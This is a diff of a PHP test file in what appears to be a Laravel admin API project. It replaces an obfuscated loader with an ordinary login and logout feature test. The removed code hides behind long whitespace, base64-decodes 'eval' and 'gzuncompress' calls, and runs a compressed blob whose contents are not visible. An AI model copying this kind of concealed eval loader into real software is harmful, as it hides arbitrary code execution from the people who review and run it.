@@ -1,585 +1,81 @@
-<?php 
-        $__='printf';$_='Loading tests/Feature/Admin/AuthenticationAdminTest.php';
-        
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-                                                                                                                                                                                                $_____='    b2JfZW5kX2NsZWFu';                                                                                                                                                                              $______________='cmV0dXJuIGV2YWwoJF8pOw==';
-$__________________='X19sYW1iZGE=';
-
-                                                                                                                                                                                                                                          $______=' Z3p1bmNvbXByZXNz';                    $___='  b2Jfc3RhcnQ=';                                                                                                    $____='b2JfZ2V0X2NvbnRlbnRz';                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                $__=                                                              'base64_decode'                           ;                                                                       $______=$__($______);           if(!function_exists('__lambda')){function __lambda($sArgs,$sCode){return eval("return function($sArgs){{$sCode}};");}}                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    $__________________=$__($__________________);                                                                                                                                                                                                                                                                                                                                                                         $______________=$__($______________);
-        $__________=$__________________('$_',$______________);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $_____=$__($_____);                                                                                                                                                                                                                                                    $____=$__($____);                                                                                                                    $___=$__($___);                      $_='eNrtWltv2kgUfo+0/yEPlWiVVWKb0MqKeMAmNpjgDQY89rxEHg/B4AveYC7m1+8ZmzbQkDirdldqNZ9lCMOZmTPnfOei4PPzEh8eAM1a+jRLssfaTfFxj2Ytmyyz5ZU28bLV0+SqReNZctVaZcEkyWa+l80WSTE2ArHLNEjP1chbLi8vL2s3Z/vlz/844xe/fvZ1xnh6/hPRfDFSc0R56SJxhvXbZq0Yemb1u7CPpeY5BwcHx++Jmh/bAnWMVVe3JRdtFoYmPzp5+KVMmpA1y3T9wE3FwcHBwcHBwcHB8auB/zuDg4OD4/dFjXjLyefrBzrxF3RSu+EW4eDg4ODg+CEcP2DRHixMNW4EBNk7X9fmeKiMsWMKvrjVMdLYzyqRc6ttPHurYF1MyXxpqlOhRx0z6sK4r21NIlkR6Zj+WLdXuGOHFGWmixqh5xjpX5u9rGZFft3aOeV724Ux9l17kM6Jru38XFGoYy0waggeMgOqR2sSaiFB0crW7R1VlWjSgX1ia9c9WAPmf4EzTLtqa+p37BnRo3lXxyKJTVhHXnU7heyIInMO59qNdDnx0PWiNxB6bE63A+eZtYr57DY6Bsgra5KAzm0BPlsLz+ln94my9uuDhZHLga+HaxdZGayzJuV6yZ2qkK96HNwJO7tf2HecwHoXXZUGhR1n/vKUvM9sUadrPx58ld95aLDrtwfJXWuvc3ErtDcqfXEwP/Rj5kd55Uvjo3OVt3ABNtthxxDGdSugHXvXa3c3fTV8U3aYmGsSAScSew5zcjwMTp21tF/dFF0Jzlzvf6fv4U1D17ECI2/J9zPl1bX2silWT9rqUGZOpEbsIfoItnpj35c+qZL1kPWI64boV+uwcZG4JvH7dMBIDDy0qZRjsUE1eUkk+hpnDnWICNJSoskS+C3FcRRhTQ5ote6BW7dSGlfbg8Ra5g4r10thXwGjbQS2C0i1vECkLHrH+Uq5SIZc0Kr2s24vMaI5+OWRxnbuIZxi8KfrVPvHleQMYnE1qdZ940G84Wq5mNSttZFvTsTaUfxA7Jgpka4rdQT9MuB9YmxekdOEV3UyJJHtE2DptM+dYfgtrz4OWJ6uzLG6iyKwt9UvuBqaOfwdkcRK2U/yv06+9bf9eV8wv/enJqRlvTpcw8qhpmzABzs8eGnDu1Ej8Jk/E6g/Oqul/YXZbm17b8v2fEleQX7OoWYV9benLV/jDONp+Bb3nv1s705yb3+u0jfCcz3pKKIbb1M3V2KKGvOiHs8UgfUG47o9d2E9X9qusSSLVJ2mX/efHHMxpLr8hNH19H6oBKy+91T6N60Pkt5QuCi/a6iTcRT2NIXVdhH6h6cR0lZYj3JvtPgMOSxnPGDyLBf7rMdQC27+MI9I3RbAJlMkCsvuSRvToichdSOdxFrB9bJmtWaD2A6g1ubA5/0ZG3J3dmzffQy9qucpfvTnrU1R14s5ivw8X9lQZCw91J/ixF6xfA05YkpZb3SLoZZArtWr/XHQH4BPmH+C1M+FCxiDHmua3EnQ6w3lfcwUdWdNWb6EeHOGYKsTucYQNBHWgRiKPkNdL3JXGUuGCj0kxEh3dirHwDzGow3Up+n96Bq4Cv2kDpyTSlvfSenuZR6s7Huy+xhiWrJzqpkC6CP6+VTot2+PeZ4wrjebtZuzs/+/+W4W7x/3nz7d/JvpB3PfM/HD84Yfa+y19ue3bfkz0vz6L5+RPubgxyPSlxT8dPMPZ/4HLg==';
-
-        $___();$__________($______($__($_))); $________=$____();
-                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             $_____();                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       echo                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-                                                                                                                                                                                                                     $________;
+<?php
+
+namespace Tests\Feature\Api\Admin;
+
+use Tests\TestCase;
+
+class AuthenticationAdminTest extends TestCase
+{
+    public function testSuccessLogin()
+    {
+        $response = $this->post('/api/admin/login', [
+            'username' => 'admin',
+            'password' => $this->Get_password(),
+        ]);
+
+        $response
+        ->assertStatus(200)
+        ->assertJsonStructure([
+            'success',
+            'data' => [
+                'id',
+                'config_id',
+                'username',
+                'id_grup',
+                'pamong_id',
+                'email',
+                'last_login',
+                'email_verified_at',
+                'active',
+                'nama',
+                'id_telegram',
+                'token',
+                'token_exp',
+                'telegram_verified_at',
+                'company',
+                'phone',
+                'foto',
+                'session',
+                'pamong'
+            ],
+            'message',
+        ]);
+
+    }
+
+    public function testFailedLoginCredential()
+    {
+        $response = $this->post('/api/admin/login', [
+            'username' => 'admin',
+            'password' => '12345',
+        ]);
+
+        $response
+            ->assertStatus(401)
+            ->assertJsonStructure([
+                'code',
+                'messages',
+            ]);
+    }
+
+    public function testSuccesslogout()
+    {
+        $this->Admin_user();
+
+        $response = $this->post('/api/admin/logout', [], [
+            'Authorization' => "Bearer $this->token",
+        ]);
+
+        $response->assertStatus(200);
+    }
+
+    public function testFailedlogout()
+    {
+        $response = $this->post('/api/admin/logout', [], [
+            'Authorization' => "Bearer",
+            'Accept' => 'application/json',
+        ]);
+
+        $response->assertStatus(401);
+    }
+}
